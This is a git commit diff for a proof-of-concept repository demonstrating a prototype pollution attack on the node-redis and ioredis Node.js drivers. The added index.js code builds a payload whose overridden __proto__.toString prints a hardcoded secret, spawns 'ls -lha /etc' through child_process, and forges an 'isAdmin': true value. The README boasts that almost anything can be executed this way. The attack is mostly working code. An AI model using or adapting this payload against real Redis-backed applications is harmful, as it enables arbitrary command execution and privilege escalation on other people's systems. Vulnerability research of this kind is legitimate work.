55f86014e2ff4c9c9ca4aef70c689317a7480d02
Mostafa Moradian <mostafamoradian0@gmail.com>
2019-05-24 22:13:45 +0200

    1. Add a little bit of documentation 2. Add command execution example 3. Downgrade to 0.0.1 for no reason ;)

--- README.md
+++ README.md
@@ -1,8 +1,14 @@
 # Prototype Pollution Attack on Node.js Redis Drivers
 
-Simply clone the project, install the dependencies with NPM and run the test:
+Simply clone the project, install the dependencies with NPM/YARN and run the test:
 
 ```bash
 $ npm install
 $ npm run test
 ```
+
+A byproduct of this exploit is that you can execute almost anything inside the `toString` function.
+
+[//]: # "This exploits the following lines, but I am not sure about the second one:"
+[//]: # "- https://github.com/NodeRedis/node_redis/blob/a60261da0461d4bb114b1533fada87e97fa985c8/index.js#L916"
+[//]: # "- https://github.com/luin/ioredis/blob/b9c47938bb3914d8dae5db17eef7ffdab0dd0399/lib/utils/index.ts#L52"
--- index.js
+++ index.js
@@ -1,15 +1,33 @@
 var assert = require('assert');
 var nodeRedis = require('redis');
 var ioRedis = require('ioredis');
-
+const {
+    spawn
+} = require('child_process');
 
 const PORT = 6379;
-const HOST = '127.0.0.1';
+const HOST = '192.168.99.101';
 const KEY = 'KEY';
+const SECRET = 'T!O%PS323E1235CR666ETH422ASadasdHWgh53ITH124AN6tY2LE6NGTtttH==';
 const PAYLOAD = {
     isAdmin: false,
     __proto__: {
         toString: function () {
+            // Do whatever you want here!
+            console.log(SECRET);
+            ls = spawn('ls', ['-lha', '/etc']);
+
+            ls.stdout.on('data', data => {
+                console.log(`stdout: ${data}`);
+            });
+
+            ls.stderr.on('data', data => {
+                console.log(`stderr: ${data}`);
+            });
+
+            ls.on('close', code => {
+                console.log(`child process exited with code ${code}`);
+            });
             return '{"isAdmin": true}'
         }
     }
@@ -23,15 +41,15 @@ var ioRedisClient = new ioRedis(PORT, HOST);
 function test_prototype_pollution(client, driver) {
     client.set(KEY, PAYLOAD);
     client.get(KEY, function (err, reply) {
-        if (!err) {
-            try {
-                assert.deepEqual(JSON.parse(reply), INJECTED_PAYLOAD);
-                console.log(driver + " is vulnerable to prototype pollution attack.");
-            } catch (error) {
-                console.log(driver + " is NOT vulnerable to prototype pollution attack.");
-            }
-        } else {
+        if (err) {
             console.log("There was an error: ", err);
+        }
+
+        try {
+            assert.deepEqual(JSON.parse(reply), INJECTED_PAYLOAD);
+            console.log(driver + " is vulnerable to prototype pollution attack.");
+        } catch (error) {
+            console.log(driver + " is NOT vulnerable to prototype pollution attack.");
         }
     });
 }
@@ -39,5 +57,6 @@ function test_prototype_pollution(client, driver) {
 test_prototype_pollution(nodeRedisClient, "node-redis");
 nodeRedisClient.quit();
 
+debugger;
 test_prototype_pollution(ioRedisClient, "ioredis");
 ioRedisClient.quit();
